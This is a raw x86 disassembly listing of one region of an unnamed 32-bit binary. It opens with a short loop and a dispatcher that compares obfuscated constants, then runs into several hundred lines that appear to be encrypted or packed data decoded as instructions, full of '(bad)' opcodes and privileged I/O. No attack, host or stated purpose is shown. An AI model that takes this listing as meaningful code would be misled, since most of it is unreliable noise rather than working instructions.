  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	dec    eax
  417e8e:	into   
  417e8f:	inc    edi
  417e90:	mov    esi,0x787f371e
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	aad    0xec
  417e9b:	test   eax,0xec0e9152
  417ea0:	sub    al,0x67
  417ea2:	in     al,dx
  417ea3:	cmp    al,0x82
  417ea5:	fist   WORD PTR [edx-0x60]
  417ea8:	(bad)  
  417ea9:	(bad)  
  417eab:	(bad)
  417eaf:	xor    DWORD PTR [ebx-0xf576e81],edx
  417eb5:	test   eax,0xd78b963
  417eba:	pop    ds
  417ebb:	ins    DWORD PTR es:[edi],dx
  417ebc:	bound  edi,QWORD PTR [eax+0x64af9611]
  417ec2:	nop
  417ec3:	xchg   DWORD PTR [ecx-0x5d],ebx
  417ec6:	xchg   esp,eax
  417ec7:	das    
  417ec8:	pop    ebx
  417ec9:	stc    
  417eca:	xchg   ebx,eax
  417ecb:	adc    DWORD PTR [edi+eax*2+0x3d],ecx
  417ecf:	(bad)  
  417ed0:	adc    al,0xf0
  417ed2:	fld    DWORD PTR [ebx]
  417ed4:	inc    ecx
  417ed5:	dec    esp
  417ed6:	pop    ebx
  417ed7:	push   ecx
  417ed8:	(bad)  
  417ed9:	fwait
  417eda:	pop    edx
  417edb:	test   al,0xb
  417edd:	ds call 0x68a7c7b4
  417ee3:	(bad)  
  417ee4:	fsub   DWORD PTR [edx+edi*1+0x1537fbad]
  417eeb:	repnz fs aad 0x69
  417eef:	stc    
  417ef0:	mov    ds:0x11ca1a31,eax
  417ef5:	pop    edx
  417ef6:	inc    eax
  417ef7:	push   eax
  417ef8:	jecxz  0x417eca
  417efa:	repz xchg cl,dl
  417efd:	not    DWORD PTR [ebx-0x56]
  417f00:	and    al,0x71
  417f02:	out    0x66,al
  417f04:	push   0x91170c94
  417f09:	aad    0xde
  417f0b:	cld    
  417f0c:	pop    ss
  417f0d:	or     al,0xaa
  417f0f:	cmp    eax,0x3050beb
  417f14:	stos   DWORD PTR es:[edi],eax
  417f15:	xor    BYTE PTR [eax],al
  417f17:	shr    BYTE PTR [ecx],0xfb
  417f1a:	push   esp
  417f1b:	cmp    eax,DWORD PTR ds:0xd5abf10a
  417f21:	aas    
  417f22:	adc    DWORD PTR [ecx-0x6fcce680],0xffffffcf
  417f29:	cmp    ah,ah
  417f2b:	or     al,BYTE PTR [edx+eiz*1-0x34a0eb29]
  417f32:	das    
  417f33:	sbb    eax,0xbdd6f706
  417f38:	lods   al,BYTE PTR ds:[esi]
  417f39:	hlt    
  417f3a:	dec    ebp
  417f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f3c:	push   ebx
  417f3d:	int    0xd1
  417f3f:	dec    ecx
  417f40:	mov    al,ds:0x76e6d430
  417f45:	mov    ds:0x22d21a1e,al
  417f4a:	out    0x43,al
  417f4c:	mov    dl,BYTE PTR [eax+0x52d90219]
  417f52:	add    eax,0x682f9d55
  417f57:	mov    ecx,?
  417f59:	popf   
  417f5a:	loop   0x417ef7
  417f5c:	pop    ss
  417f5d:	mov    ebp,0xb7eeace8
  417f62:	push   0x72694338
  417f67:	mov    eax,ds:0xc7c952ec
  417f6c:	jle    0x417f8f
  417f6e:	push   edi
  417f6f:	(bad)  
  417f70:	cwde   
  417f71:	mov    ecx,0x12902956
  417f76:	mov    ebx,0xbda77f33
  417f7b:	fs xor al,0xdd
  417f7e:	inc    edx
  417f7f:	fisttp WORD PTR [ecx]
  417f81:	xchg   esp,eax
  417f82:	fadd   QWORD PTR [esi-0x1a]
  417f85:	ror    BYTE PTR [ebp+0x7],1
  417f88:	inc    ecx
  417f89:	mov    bh,0x28
  417f8b:	lahf   
  417f8c:	(bad)  
  417f8d:	jns    0x417fc5
  417f8f:	dec    esp
  417f90:	cmc    
  417f91:	pop    eax
  417f92:	shl    BYTE PTR [edi+0x61],0x7d
  417f96:	sub    al,0x65
  417f98:	pusha  
  417f99:	(bad)  
  417f9a:	inc    esp
  417f9b:	dec    edx
  417f9c:	fucomip st,st(6)
  417f9e:	mov    ecx,0xf614677
  417fa3:	mov    ch,0x2
  417fa5:	jno    0x418007
  417fa7:	retf   0xd5a1
  417faa:	dec    esp
  417fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fac:	int    0x2
  417fae:	sar    BYTE PTR [ebp+0x32],0x3b
  417fb2:	fs daa 
  417fb4:	inc    edx
  417fb5:	imul   ecx,esp,0xcf272a3f
  417fbb:	cmp    bh,BYTE PTR [ecx]
  417fbd:	mov    eax,0xf523a260
  417fc2:	out    0xfd,eax
  417fc4:	mov    esi,0x8694fc0a
  417fc9:	and    DWORD PTR [edi-0x3b76cc9c],ebx
  417fcf:	xchg   ecx,eax
  417fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd1:	test   DWORD PTR [edx],ecx
  417fd3:	jo     0x418002
  417fd5:	mov    dh,0xaf
  417fd7:	adc    edi,DWORD PTR [ecx+0x38]
  417fda:	xchg   ebp,eax
  417fdb:	inc    esi
  417fdc:	clc    
  417fdd:	mov    al,ds:0xf991d466
  417fe2:	lahf   
  417fe3:	mov    ebp,ecx
  417fe5:	mov    dl,0x58
  417fe7:	retf   
  417fe8:	js     0x418005
  417fea:	sbb    bh,BYTE PTR [ecx+0x26]
  417fed:	mov    edi,0xc705f38d
  417ff2:	pusha  
  417ff3:	pop    es
  417ff4:	inc    ebp
  417ff5:	sbb    edx,ecx
  417ff7:	xchg   edx,eax
  417ff8:	in     al,0x95
  417ffa:	(bad)  
  417ffb:	rcr    DWORD PTR [eax],0xaf
  417ffe:	inc    esi
  417fff:	pop    ss
  418000:	stos   BYTE PTR es:[edi],al
  418001:	inc    edx
  418002:	scas   al,BYTE PTR es:[edi]
  418003:	dec    esp
  418004:	movd   mm0,DWORD PTR [ebx+eax*8]
  418008:	cmp    BYTE PTR [edx+ecx*1+0x39],ah
  41800c:	xchg   edx,eax
  41800d:	sub    ecx,esp
  41800f:	stos   BYTE PTR es:[edi],al
  418010:	push   ds
  418011:	and    DWORD PTR [edx-0x76d4e558],0x4
  418018:	pusha  
  418019:	gs inc ebx
  41801b:	inc    ebp
  41801c:	call   0x553ab2c1
  418021:	mov    bh,BYTE PTR [eax]
  418023:	inc    BYTE PTR [esi+0x43]
  418026:	xor    al,0x32
  418028:	mov    ebx,0x48f141bb
  41802d:	jae    0x418033
  41802f:	dec    ebp
  418030:	mov    ebp,0xd09e331d
  418035:	push   es
  418036:	rcl    DWORD PTR [ecx-0x44],0x18
  41803a:	fwait
  41803b:	sub    BYTE PTR [eax+0x4c7558ca],0x75
  418042:	xchg   esp,eax
  418043:	imul   ebx,DWORD PTR [ecx+0x50e4eae9],0xf2468119
  41804d:	mov    ecx,0xba75990b
  418052:	(bad)  
  418053:	popf   
  418054:	bnd jne 0x4180d3
  418057:	mov    bl,0x11
  418059:	clc    
  41805a:	pop    es
  41805b:	stos   BYTE PTR es:[edi],al
  41805c:	aam    0x79
  41805e:	fucomip st,st(3)
  418060:	mov    cl,0x59
  418062:	sbb    DWORD PTR ds:0x2d133129,0x2a
  418069:	out    0x48,eax
  41806b:	jo     0x4180ae
  41806d:	test   al,0x32
  41806f:	nop
  418070:	jl     0x4180d9
  418072:	jns    0x4180ee
  418074:	jae    0x41802e
  418076:	dec    ebp
  418077:	inc    eax
  418078:	stos   BYTE PTR es:[edi],al
  418079:	jns    0x4180d4
  41807b:	dec    ecx
  41807c:	sar    BYTE PTR [eax+edi*1],1
  41807f:	mov    esp,0x1c39b831
  418084:	rol    ah,cl
  418086:	punpckhdq mm1,QWORD PTR [edi]
  418089:	das    
  41808a:	int3   
  41808b:	push   eax
  41808c:	jle    0x4180cf
  41808e:	stos   BYTE PTR es:[edi],al
  41808f:	rcr    BYTE PTR [eax+0x449cd3de],0x7f
  418096:	ins    DWORD PTR es:[edi],dx
  418097:	xor    BYTE PTR [edx],bh
  418099:	jb     0x41801d
  41809b:	out    0x45,al
  41809d:	aas    
  41809e:	cwde   
  41809f:	mov    ds:0x1f203b0b,eax
  4180a4:	lods   al,BYTE PTR ds:[esi]
  4180a5:	enter  0xc1d9,0xba
  4180a9:	inc    edx
  4180aa:	inc    eax
  4180ab:	retf   
  4180ac:	pushf  
  4180ad:	fdiv   QWORD PTR [esi+0x6]
  4180b0:	dec    ebx
  4180b1:	aaa    
  4180b2:	test   esi,edi
  4180b4:	ldmxcsr DWORD PTR [ebp+0x59]
  4180b8:	sbb    bh,BYTE PTR ds:[eax+0x2acfff51]
  4180bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c0:	in     eax,dx
  4180c1:	sbb    eax,0x2af32b29
  4180c6:	gs ret 0x1364
  4180ca:	jns    0x4180a1
  4180cc:	cmc    
  4180cd:	dec    esi
  4180ce:	test   ebx,0xeaffb052
  4180d4:	sti    
  4180d5:	mov    dh,0x18
  4180d7:	lods   al,BYTE PTR ds:[esi]
  4180d8:	inc    edx
  4180d9:	sar    esp,1
  4180db:	pop    esp
  4180dc:	into   
  4180dd:	iret   
  4180de:	sbb    cl,BYTE PTR [ebp-0x43]
  4180e1:	dec    edx
  4180e2:	(bad)  
  4180e3:	addr16 mov dh,0x4a
  4180e6:	sbb    ecx,edi
  4180e8:	neg    cl
  4180ea:	lds    edx,FWORD PTR [edx+edx*2]
  4180ed:	ins    DWORD PTR es:[edi],dx
  4180ee:	sbb    eax,DWORD PTR [ebx-0x2b380c14]
  4180f4:	addr16 shl dh,cl
  4180f7:	mov    bh,0xf3
  4180f9:	scas   eax,DWORD PTR es:[edi]
  4180fa:	je     0x4180ec
  4180fc:	pop    es
  4180fd:	push   ebp
  4180fe:	inc    ebp
  4180ff:	mov    eax,0x45d374b0
  418104:	jne    0x41810d
  418106:	or     edx,ebp
  418108:	dec    ecx
  418109:	mov    ch,0x2d
  41810b:	push   ebp
  41810c:	and    DWORD PTR [eax+0x35],esi
  41810f:	js     0x418097
  418111:	xchg   ebp,eax
  418112:	and    ebp,DWORD PTR [ebx-0x23cb5af7]
  418118:	push   edx
  418119:	out    0xc2,al
  41811b:	mov    ah,0x27
  41811d:	lods   al,BYTE PTR ds:[esi]
  41811e:	push   edx
  41811f:	sub    edx,DWORD PTR ds:0x1fc9b333
  418125:	mov    ah,0x83
  418127:	inc    esp
  418128:	pop    ss
  418129:	xor    eax,esp
  41812b:	call   0xcfb1:0xd8060f2
  418132:	jge    0x418153
  418134:	add    esp,DWORD PTR [ebx+0x4f]
  418137:	ret    0x93b8
  41813a:	sbb    al,0xab
  41813c:	sar    ebx,cl
  41813e:	sti    
  41813f:	inc    eax
  418140:	sub    DWORD PTR [ecx+edi*8-0x76],eax
  418144:	sar    DWORD PTR [ebx+0x3e2daf46],0x61
  41814b:	sbb    dh,cl
  41814d:	gs cwde 
  41814f:	mov    bl,0xa4
  418151:	out    0x73,al
  418153:	inc    eax
  418154:	out    dx,al
  418155:	pusha  
  418156:	pop    esp
  418157:	jp     0x41812d
  418159:	pushf  
  41815a:	xchg   ebp,eax
  41815b:	push   ecx
  41815c:	pop    ds
  41815d:	add    al,ch
  41815f:	sbb    al,0x5a
  418161:	add    al,0x34
  418163:	(bad)  
  418164:	jo     0x4181b9
  418166:	cmp    al,BYTE PTR [edx]
  418168:	and    BYTE PTR [ebp-0x60],0x9a
  41816c:	inc    ecx
  41816d:	or     DWORD PTR [ecx],edi
  41816f:	clc    
  418170:	nop
  418171:	pop    edx
  418172:	daa    
  418173:	out    dx,al
  418174:	pop    ebx
  418175:	mov    ds:0x68f9d5bb,al
  41817a:	mov    ds:0x1513a851,eax
  41817f:	nop
  418180:	sub    ebp,DWORD PTR [esi-0x5f]
  418183:	sub    al,0x98
  418185:	stos   DWORD PTR es:[edi],eax
  418186:	fwait
  418187:	les    edi,FWORD PTR [ebx-0x7c90c7fe]
  41818d:	inc    esi
  41818e:	cmp    eax,0xd6f4a11c
  418193:	jg     0x4181d2
  418195:	aam    0x8b
  418197:	jne    0x4181a5
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	push   es
  4181b8:	(bad)  
  4181b9:	(bad)  
  4181ba:	ja     0x4181d5
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41819b
  4181c4:	and    eax,0x8687f099
  4181c9:	mov    ebp,0x65086234
  4181ce:	dec    eax
  4181cf:	xor    bl,BYTE PTR [edx+eax*8-0x6447a048]
  4181d6:	shl    BYTE PTR [ebp-0x47fde399],0x3a
  4181dd:	out    dx,eax
  4181de:	idiv   DWORD PTR [edx+0x5bab60c7]
  4181e4:	xchg   ebx,eax
  4181e5:	test   dh,cl
  4181e7:	dec    ecx
  4181e8:	loop   0x4181d4
  4181ea:	xchg   BYTE PTR [ebx+0x22],bh
  4181ed:	dec    edi
  4181ee:	sbb    eax,0xf68b6ad3
  4181f3:	ds xchg edx,eax
  4181f5:	stc    
  4181f6:	push   ss
  4181f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f8:	fisttp QWORD PTR ds:0xc46d06be
  4181fe:	adc    ebx,DWORD PTR [ebp+0x34]
  418201:	inc    ebx
  418202:	sub    al,0xfe
  418204:	mov    ?,edx
  418206:	push   ds
  418207:	(bad)
  41820b:	sar    BYTE PTR [esp+ecx*2-0x67dbeb6e],cl
  418212:	xor    eax,0x7cb4d4fe
  418217:	hlt    
  418218:	mov    dh,0x59
  41821a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41821b:	inc    edx
  41821c:	adc    BYTE PTR [esi],ch
  41821e:	jg     0x4181f1
  418220:	jge    0x4181f1
  418222:	mul    BYTE PTR [edi]
  418224:	sahf   
  418225:	push   0x57
  418227:	mov    DWORD PTR [edi-0x34],edi
  41822a:	mov    ds:0xdbffbe81,al
  41822f:	gs push ds
  418231:	inc    ebp
  418232:	aam    0x83
  418234:	or     BYTE PTR [ebx],ch
  418236:	mov    al,ds:0x52421311
  41823b:	push   0x6fb14bd7
  418240:	push   0xffffff82
  418242:	jo     0x418286
  418244:	das    
  418245:	addr16 fcmove st,st(7)
  418248:	jbe    0x4181f6
  41824a:	les    ecx,FWORD PTR [edi+eiz*8+0x723924ff]
  418251:	inc    ecx
  418252:	mov    DWORD PTR [esi],ebx
  418254:	fsub   DWORD PTR [edx+0x31]
  418257:	dec    edx
  418258:	pop    ss
  418259:	add    cl,BYTE PTR [edx-0x23]
  41825c:	jne    0x418273
  41825e:	inc    edx
  41825f:	mov    BYTE PTR [ecx+0x6c2ab000],cl
  418265:	mov    ah,dh
  418267:	imul   ebx,DWORD PTR [edx],0xffffffdf
  41826a:	inc    ecx
  41826b:	sbb    BYTE PTR [edx+0x56e81c0d],bh
  418271:	mov    cl,0xd
  418273:	xor    al,0x85
  418275:	frstor [edi+0x10]
  418278:	test   BYTE PTR [ecx-0x120c8b28],dl
  41827e:	sub    dh,BYTE PTR [ecx+0x64]
  418281:	adc    al,BYTE PTR [ebx+edx*4]
  418284:	ins    BYTE PTR es:[edi],dx
  418285:	call   0x31c9066a
  41828a:	in     eax,0xe8
  41828c:	xchg   edx,eax
  41828d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41828e:	and    al,0xf2
  418290:	inc    ecx
  418291:	mov    BYTE PTR [ecx-0x80],ah
  418294:	jne    0x418254
  418296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418297:	inc    edx
  418298:	jl     0x41825f
  41829a:	push   0x2d2e740e
  41829f:	jge    0x4182fa
  4182a1:	bound  esi,QWORD PTR [ebx]
  4182a3:	ins    DWORD PTR es:[edi],dx
  4182a4:	or     ch,BYTE PTR [ecx]
  4182a6:	mov    DWORD PTR [edx+0x47],0x26cfb318
  4182ad:	add    eax,0xa5f29272
  4182b2:	xchg   DWORD PTR [ecx-0x45],edi
  4182b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182b6:	mov    ds:0x1a3d11e,eax
  4182bb:	in     al,0x31
  4182bd:	pop    ds
  4182be:	mov    bl,0x0
  4182c0:	inc    edx
  4182c1:	mov    al,ds:0xc20f05b9
  4182c6:	and    BYTE PTR [eax-0x4f],0xc9
  4182ca:	mov    ds:0x393b67eb,eax
  4182cf:	mov    cs:0x91ca58a5,al
  4182d5:	sub    eax,0x59e7a698
  4182da:	paddsb mm1,QWORD PTR [ecx-0x4312e03a]
  4182e1:	stc    
  4182e2:	fstp   DWORD PTR [edi-0x6387affb]
  4182e8:	in     ax,dx
  4182ea:	xor    esi,DWORD PTR [eax+0x719f9f8b]
  4182f0:	sub    bh,ch
  4182f2:	xchg   edi,eax
  4182f3:	push   ebp
  4182f4:	fistp  DWORD PTR [ecx]
  4182f6:	cmp    bl,BYTE PTR [ecx+eax*1+0x44b1e94f]
  4182fd:	pusha  
  4182fe:	cli    
  4182ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418300:	stc    
  418301:	push   eax
  418302:	cli    
  418303:	int3   
  418304:	outs   dx,BYTE PTR ds:[esi]
  418305:	je     0x4182c3
  418307:	arpl   WORD PTR [edi],bp
  418309:	inc    ebx
  41830a:	stos   BYTE PTR es:[edi],al
  41830b:	sbb    eax,0xea2f8c46
  418310:	push   0xb38602bf
  418315:	jge    0x41832c
  418317:	loopne 0x4182b0
  418319:	aas    
  41831a:	mov    ecx,0x6b196141
  41831f:	mov    bl,0xd9
  418321:	aam    0xf8
  418323:	cmp    DWORD PTR [edx-0x686c8b6f],edi
  418329:	pop    ebx
  41832a:	inc    esi
  41832b:	cli    
  41832c:	aam    0xd
  41832e:	cwde   
  41832f:	ja     0x418323
  418331:	int3   
  418332:	outs   dx,DWORD PTR ds:[esi]
  418333:	mov    eax,ds:0x99eb778c
  418338:	dec    eax
  418339:	inc    edi
  41833a:	mov    dl,0x8b
  41833c:	shl    DWORD PTR [ecx-0x1d024c9c],cl
  418342:	sub    DWORD PTR [esi],0x3907f4b8
  418348:	jge    0x41834a
  41834a:	sbb    al,0xd5
  41834c:	push   ebp
  41834d:	mov    bl,0x97
  41834f:	fadd   QWORD PTR [eax-0x3e]
  418352:	and    BYTE PTR [esi-0x28],ah
  418355:	fst    DWORD PTR [ebx]
  418357:	mov    al,ds:0xaf7117c8
  41835c:	int3   
  41835d:	push   ebp
  41835e:	cmp    ch,cl
  418360:	sbb    DWORD PTR [esi+0x7e0f2864],0xab2c3812
  41836a:	ds pop edx
  41836c:	lods   eax,DWORD PTR es:[esi]
  41836e:	aaa    
  41836f:	add    BYTE PTR [edx+0x43],0xd0
  418373:	dec    esp
  418374:	daa    
  418375:	in     al,0xae
  418377:	xchg   ch,ah
  418379:	(bad)  
  41837a:	xor    edi,DWORD PTR [esi+0x70d8312]
  418380:	mov    dh,BYTE PTR [eax-0xf]
  418383:	pop    esp
  418384:	pop    ss
  418385:	mov    al,ds:0x73543bf5
  41838a:	hlt    
  41838b:	jo     0x4183aa
  41838d:	in     eax,0xa7
  41838f:	mov    bl,0xbb
  418391:	sub    BYTE PTR [edx-0x3e1f2f9d],al
  418397:	stc    
  418398:	hlt    
  418399:	bound  esi,QWORD PTR [bx+di]
  41839c:	jecxz  0x4183fe
  41839e:	cmp    DWORD PTR [ecx+0x64a43124],esp
  4183a4:	cmp    BYTE PTR [ebp+0x71e71145],0x4f
  4183ab:	iret   
  4183ac:	(bad)  
  4183ad:	mov    ecx,0xe07f8dc0
  4183b2:	and    DWORD PTR [edi+eax*1-0x5],0x35
  4183b7:	fdiv   DWORD PTR [ebp-0x5a121733]
  4183bd:	sub    al,0x5a
  4183bf:	arpl   WORD PTR [esp+eiz*2-0x7f],ax
  4183c3:	jecxz  0x4183fc
  4183c5:	add    cl,ch
  4183c7:	adc    DWORD PTR [ebx],ebx
  4183c9:	neg    DWORD PTR [edx]
  4183cb:	cmp    eax,0x8ff1bc5b
  4183d0:	xor    DWORD PTR [esi-0x28],eax
  4183d3:	pop    ds
  4183d4:	imul   edx,DWORD PTR [ebp-0x5384812d],0x677aeb2c
  4183de:	jge    0x41837d
  4183e0:	jb     0x41836f
  4183e2:	gs and esp,0xffffff97
  4183e6:	ret    
  4183e7:	xor    bl,BYTE PTR [edi+esi*2+0x63]
  4183eb:	sar    BYTE PTR [eax],1
  4183ed:	sub    esp,0xffffffcb
  4183f0:	xchg   ebx,eax
  4183f1:	adc    esi,DWORD PTR [esp+eax*4+0xd]
  4183f5:	into   
  4183f6:	iret   
  4183f7:	cmp    edx,DWORD PTR [ebx]
  4183f9:	add    bl,BYTE PTR [edi-0xa0e95ba]
  4183ff:	push   es
  418400:	out    0x60,al
  418402:	(bad)  
  418403:	mov    esp,0x5efe7d84
  418408:	hlt    
  418409:	cmp    dh,BYTE PTR [ebx+0x30b36ec4]
  41840f:	mov    dl,0xdd
  418411:	pop    esp
  418412:	dec    DWORD PTR [ebp+0x51]
  418415:	fcomp  DWORD PTR ds:0x25a8f21f
  41841b:	call   0x86abaf64
  418420:	fdiv   DWORD PTR [edx+eiz*2+0x70]
  418424:	xor    BYTE PTR [edi-0x76b7436b],bh
  41842a:	pop    es
  41842b:	outs   dx,BYTE PTR ds:[esi]
  41842c:	sub    eax,0xa984ea4a
  418431:	lods   al,BYTE PTR ds:[esi]
  418432:	pop    esp
  418433:	inc    ecx
  418434:	cmp    BYTE PTR [ebx],cl
  418436:	imul   esi,DWORD PTR [esi+0x6a354218],0x63d7c809
  418440:	adc    ah,bh
  418442:	mov    ecx,0x846189e1
  418447:	lods   eax,DWORD PTR ds:[esi]
  418448:	imul   esp,edx,0x24
  41844b:	pop    ebx
  41844c:	mov    BYTE PTR [esi],dh
  41844e:	ins    DWORD PTR es:[edi],dx
  41844f:	ficomp DWORD PTR [esi+0x7c]
  418452:	jge    0x41843b
  418454:	shl    DWORD PTR [esi+0x2a],0x22
  418458:	pop    ds
  418459:	cmp    esp,DWORD PTR [edx-0x18]
  41845c:	add    ebp,DWORD PTR [edi+0x61a64a8d]
  418462:	push   ds
  418463:	rol    DWORD PTR [ebp+0x3e3b08d0],cl
  418469:	imul   ebp,DWORD PTR [ebx],0xea9c7c68
  41846f:	cmp    esi,DWORD PTR [edi-0x28]
  418472:	hlt    
  418473:	inc    esp
  418474:	mov    ds:0xf2d8f3f8,eax
  418479:	fcomp  DWORD PTR [eax]
  41847b:	dec    eax
  41847c:	adc    BYTE PTR [ebp+0x77436752],bh
  418482:	ja     0x4184dd
  418484:	aas    
  418485:	retf   0xe314
  418488:	push   eax
  418489:	xor    ah,BYTE PTR [ecx]
  41848b:	and    BYTE PTR [ebx+0x28de6078],0x2f
  418492:	arpl   WORD PTR [eax+0x28],sp
  418495:	aaa    
  418496:	jo     0x4184a1
  418498:	sub    edx,edi
  41849a:	xor    bh,BYTE PTR [ecx+eax*2-0x505b4a11]
  4184a1:	es pop ebp
  4184a3:	out    dx,al
  4184a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184a5:	or     al,0x54
  4184a7:	sub    DWORD PTR [edi-0x7f],edx
  4184aa:	fild   QWORD PTR [edi]
  4184ac:	xchg   edx,eax
  4184ad:	cs mov dl,BYTE PTR es:[eax+0x50]
  4184b2:	std    
  4184b3:	neg    DWORD PTR [edi-0x70d64f99]
  4184b9:	ins    DWORD PTR es:[edi],dx
  4184ba:	add    DWORD PTR [eax+0x4fb5a4bd],edi
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x34ec6d48
  4184e3:	jl     0x4184a2
  4184e5:	pop    ecx
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	popa   
  4184ef:	adc    dh,BYTE PTR [ebp-0x54]
  4184f2:	push   ebx
  4184f3:	lods   al,BYTE PTR ds:[esi]
  4184f4:	sbb    bh,BYTE PTR [edx-0x60]
  4184f7:	jae    0x418538
  4184f9:	adc    edx,0x61647da3
  4184ff:	mov    al,ds:0x3c3bd968
  418504:	loopne 0x4184ad
  418506:	cmp    ch,al
  418508:	popa   
  418509:	dec    ebx
  41850a:	mov    ebx,0xe2c0a298
  41850f:	mov    ch,0x1a
  418511:	mov    ds:0x3f3f789e,eax
  418516:	inc    BYTE PTR [ecx-0x2b]
  418519:	daa    
  41851a:	pop    ebx
  41851b:	(bad)  
  41851c:	push   ds
  41851d:	popf   
  41851e:	jge    0x4184e4
  418520:	inc    edi
  418521:	out    0x1a,al
  418523:	ret    
  418524:	fs (bad) 
  418526:	sub    ax,0xa024
  41852a:	push   es
  41852b:	test   eax,0xda7b7062
  418530:	lea    ebp,[edx+edx*8]
  418533:	out    dx,al
  418534:	lock cmp al,0xf9
  418537:	enter  0x2c51,0xe3
  41853b:	fsub   QWORD PTR [edx+0x66a15f1f]
  418541:	jecxz  0x418502
  418543:	mov    ds:0x77ce0213,eax
  418548:	stos   DWORD PTR es:[edi],eax
  418549:	cs cmp al,0xb1
  41854c:	mov    edi,0x254356e2
  418551:	stos   BYTE PTR es:[edi],al
  418552:	call   DWORD PTR [edi-0x34873777]
  418558:	pop    edi
  418559:	adc    eax,0x35396393
  41855e:	sbb    ecx,edi
  418560:	cli    
  418561:	scas   al,BYTE PTR es:[edi]
  418562:	jno    0x41855a
  418564:	xor    ecx,edx
  418566:	fst    QWORD PTR [esi]
  418568:	(bad)  
  418569:	out    dx,eax
  41856a:	pop    edx
  41856b:	pop    esp
  41856c:	inc    edx
  41856d:	lods   al,BYTE PTR ds:[esi]
  41856e:	leave  
  41856f:	pop    edx
  418570:	xor    BYTE PTR [edi],cl
  418572:	stos   BYTE PTR es:[edi],al
  418573:	(bad)  
  418574:	sub    ecx,DWORD PTR [esi-0x3a509d1d]
  41857a:	call   DWORD PTR [edx+0x1e]
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	or     DWORD PTR [ebp-0x5e],ebp
  418581:	jns    0x418562
  418583:	mov    ecx,0xa2f2bf7b
  418588:	jae    0x418599
  41858a:	xor    al,0x84
  41858c:	retf   
  41858d:	stos   DWORD PTR es:[edi],eax
  41858e:	fst    DWORD PTR [ebx+0x5f]
  418591:	je     0x418590
  418593:	outs   dx,DWORD PTR ds:[esi]
  418594:	sub    eax,0xdacf2faf
  418599:	leave  
  41859a:	xchg   edx,eax
  41859b:	add    al,0xb0
  41859d:	test   BYTE PTR [ebp-0x60],ah
  4185a0:	scas   eax,DWORD PTR es:[edi]
  4185a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a2:	inc    ebx
  4185a3:	mov    ds:0xf09951f2,al
  4185a8:	cld    
  4185a9:	stos   BYTE PTR es:[edi],al
  4185aa:	dec    edx
  4185ab:	mov    ecx,0xfc2bfb7b
  4185b0:	rol    BYTE PTR [ecx],0x55
  4185b3:	imul   esp,DWORD PTR [edx+eiz*1-0x2b],0x81dc61dd
  4185bb:	loope  0x41857d
  4185bd:	gs cmp ecx,edx
  4185c0:	addr16 xchg ebx,eax
  4185c2:	and    al,0x8a
  4185c4:	dec    ebp
  4185c5:	pop    esi
  4185c6:	xchg   ecx,eax
  4185c7:	xor    DWORD PTR [ebx-0x51999aa7],ecx
  4185cd:	jg     0x418598
  4185cf:	out    0x49,eax
  4185d1:	icebp  
  4185d2:	loope  0x4185c0
  4185d4:	xchg   esp,eax
  4185d5:	int    0x67
  4185d7:	int    0xb1
  4185d9:	xchg   eax,edi
  4185db:	cmp    al,0xe3
  4185dd:	lock push es
  4185df:	mov    ebp,0xdcb197ff
  4185e4:	mov    esp,DWORD PTR [ebx+0xd]
  4185e7:	std    
  4185e8:	das    
  4185e9:	neg    BYTE PTR [ebp-0x3c4098ca]
  4185ef:	push   ds
